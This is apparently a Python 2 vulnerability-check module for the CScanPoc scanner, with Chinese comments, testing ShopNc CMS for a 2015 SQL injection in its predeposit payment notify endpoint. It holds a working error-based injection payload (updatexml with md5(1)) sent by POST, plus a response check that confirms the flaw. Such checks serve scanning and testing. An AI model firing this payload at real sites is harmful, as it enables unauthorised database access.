# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'ShopNc_0004' # 平台漏洞编号，留空
    name = 'ShopNc SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        ShopNc SQL注入漏洞。
        /index.php?act=predeposit_payment&op=notify
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ShopNc CMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '836e8a31-9a46-4d7c-9fed-c4904aeba91c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer:http://www.wooyun.org/bugs/wooyun-2010-0125517
            hh = hackhttp.hackhttp()
            arg = self.target
            post = 'out_trade_no%5B0%5D=exp&out_trade_no%5B1%5D=%20%201=1%20and%20(updatexml(1,concat(0x3a,(select%20md5(1))),1))'
            target = arg + '/index.php?act=predeposit_payment&op=notify'
            code, head, res, errcode, _ = hh.http(target, post=post)

            if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
